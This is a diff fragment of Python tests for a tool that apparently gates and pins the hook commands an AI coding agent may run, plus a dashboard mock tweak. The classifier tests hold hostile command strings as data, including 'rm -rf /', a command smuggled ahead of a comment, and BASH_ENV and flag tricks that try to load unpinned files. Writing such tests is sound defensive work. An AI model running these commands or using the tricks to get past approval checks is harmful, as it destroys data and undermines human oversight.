+        self.assertIn("BLOCKED", out); self.assertIn("ACCEPTED", out); self.assertIn('"pins": ["scripts/check.sh"]', out)
+
+    def test_runner_commands_never_get_committed(self):
+        self.pinned_setup()
+        d = json.loads((self.repo / ".claude/settings.json").read_text()); d["model"] = "x"
+        (self.repo / ".claude/settings.json").write_text(json.dumps(d))  # someone edits the filtered file
+        self.git("commit", "-qam", "edit settings")
+        stored = self.git("show", "HEAD:.claude/settings.json").stdout
+        self.assertNotIn("run-approved", stored); self.assertIn(self.CHECK, stored); self.assertIn('"model"', stored)
+
+    def test_story_gate_hook_accepts_the_runner_and_dict_entries(self):
+        self.pinned_setup()
+        r = self.hook()
+        self.assertNotIn("hasn't approved", r.stderr)
+        self.assertNotIn("internal error", r.stderr)
+
+    def test_pin_check_hints_at_missing_files(self):
+        self.setup_main([self.CHECK], [{"command": self.CHECK, "pins": ["scripts/check.sh"]}],
+                        {"scripts/check.sh": "source scripts/lib.sh\necho ok\n", "scripts/lib.sh": "x=1\n"})
+        self.assertIn("pins may be incomplete", self.admin("doctor").stdout)
+
+    def test_classifier(self):
+        sys.path.insert(0, str(SRC))
+        try:
+            import importlib, sg_pin
+            importlib.reload(sg_pin)
+            a = sg_pin.analyse
+            self.assertTrue(a("npm run lint", str(self.repo), None)["runner"])
+            self.assertTrue(a("python -m tools.check", str(self.repo), None)["runner"])
+            self.assertFalse(a("bash x.sh && rm -rf /", str(self.repo), None)["simple"])
+            self.assertEqual(a('bash "$CLAUDE_PROJECT_DIR/scripts/a.sh"', str(self.repo), None)["refs"], ["scripts/a.sh"])
+            self.assertEqual(a("bash ../outside.sh", str(self.repo), None)["outside"], ["../outside.sh"])
+            self.assertEqual(sg_pin.unwrap_cmd(sg_pin.wrap("bash a b", "/py", "/l.py"), launcher="/l.py"), "bash a b")
+            self.assertIsNone(sg_pin.unwrap_cmd(sg_pin.wrap("bash a b", "/py", "/other.py"), launcher="/l.py"))
+            self.assertIsNone(sg_pin.unwrap_cmd("bash evil.sh # " + sg_pin.wrap("bash a b", "/py", "/l.py"), launcher="/l.py"))
+            top = str(self.repo)
+            for cmd in ("CI=1 npm test", "env npm test", "time make", "bash -c 'scripts/check.sh a'", "python -W ignore -m pytest",
+                        "python3 -c 'import evil'", "pytest", "eslint .", "node tools/new.js", "python3 scripts/new.py", "bash",
+                        "echo $HOME", "notify-send %USERNAME%"):
+                self.assertNotEqual(sg_pin.classify(cmd, top, None, None)[0], "plain", cmd)
+            for cmd in ("BASH_ENV=lib/x.sh bash scripts/check.sh", "bash scripts/check.sh -flib/x.sh",
+                        "bash scripts/check.sh --opt=a,lib/x.sh"):
+                self.assertNotEqual(sg_pin.classify(cmd, top, None, {"pins": ["scripts", "lib"]})[0], "pinned", cmd)
+            self.assertEqual(sg_pin.classify("echo done", top, None, None)[0], "plain")
+            self.assertEqual(sg_pin.classify("bash scripts/check.sh", top, None, {"pins": ["scripts"]})[0], "pinned")
+            self.assertEqual(sg_pin.entries({"project_hooks_allowed": [{"command": "x", "pins": [".", ":(glob)*", "../a", "ok/dir/"]}]})["x"]["pins"], ["ok/dir"])
+        finally:
+            sys.path.remove(str(SRC))
 
 
 @unittest.skipUnless(shutil.which("ssh-keygen"), "needs ssh-keygen")
@@ -1698,7 +2156,8 @@ class TestDashboard(Base):
             if "/pulls?" in path:
                 seen["n"] += 1
                 if seen["n"] == 1: return 429, {}, {"Retry-After": "1"}
-                return 200, [{"number": 5, "head": {"ref": "feat/SAT-5", "sha": "abc"}}], {}
+                return 200, [{"number": 5, "head": {"ref": "feat/SAT-5", "sha": "abc", "repo": {"full_name": "o/r"}}},
+                             {"number": 9, "head": {"ref": "feat/SAT-5", "sha": "fff", "repo": {"full_name": "fork/r"}}}], {}  # a fork's same-named branch
             if "/check-runs" in path: return 200, {"check_runs": [{"conclusion": "success"}]}, {}
             return 404, {}, {}
         G.call = call
